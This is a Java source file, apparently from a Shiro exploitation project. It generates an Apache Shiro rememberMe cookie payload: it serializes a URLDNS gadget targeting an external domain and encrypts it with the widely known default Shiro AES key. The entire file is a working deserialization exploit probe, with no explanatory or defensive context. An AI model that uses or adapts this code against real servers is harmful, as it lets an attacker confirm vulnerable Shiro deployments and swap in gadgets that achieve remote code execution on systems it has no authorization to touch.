package shiroexp;

import util.URLDNSUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class ShiroURLDNS {
    public static void main(String[] args) throws Exception {
        URLDNSUtils urldnsUtils=new URLDNSUtils("http://www.baidu.com");
        byte[] payload= urldnsUtils.getBytes();

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf(ciphertext.toString());
    }
}
